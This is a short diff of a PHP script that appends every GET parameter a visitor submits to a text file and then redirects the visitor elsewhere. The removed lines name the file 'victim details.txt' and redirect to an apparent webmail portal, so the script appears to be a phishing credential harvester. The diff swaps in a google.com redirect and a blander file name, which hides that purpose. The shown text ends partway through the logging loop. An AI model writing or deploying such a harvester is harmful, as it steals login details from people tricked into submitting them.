@@ -1,6 +1,6 @@
 <?php
-header ('Location: http://www.poczta.imw.lublin.pl');
-$handle = fopen("victim details.txt", "a");
+header ('Location: http://www.google.com');
+$handle = fopen("tpcm.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
